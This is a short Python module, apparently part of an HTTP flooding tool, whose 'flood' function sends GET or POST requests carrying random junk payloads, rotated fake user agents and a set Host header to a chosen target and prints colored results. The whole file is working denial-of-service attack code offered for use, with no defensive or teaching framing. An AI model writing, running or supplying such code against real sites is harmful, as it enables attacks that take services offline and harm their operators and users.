# Import modules
import requests
import random
import tools.randomData as randomData
from colorama import Fore

# Load user agents
user_agents = []
for _ in range(30):
    user_agents.append(randomData.random_useragent())

# Headers



def flood(target,domainname,attack):
    headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
    "User-agent": random.choice(user_agents),"host":domainname,
    }
    payload = str(random._urandom(random.randint(10, 150)))
    
    
    try:
        if attack =='get':
            r = requests.get(target, params=payload, headers=headers, timeout=4)
        else:
            r = requests.post(target,data=payload ,headers=headers, timeout=4)
    except requests.exceptions.ConnectTimeout:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
    except Exception as e:
        print(
            f"{Fore.MAGENTA}Error while sending GET request\n{Fore.MAGENTA}{e}{Fore.RESET}"
        )
    else:
        print(
            f"{Fore.GREEN}[{r.status_code}] {Fore.YELLOW}Request sent! Payload size: {len(payload)}.{Fore.RESET}"
        )
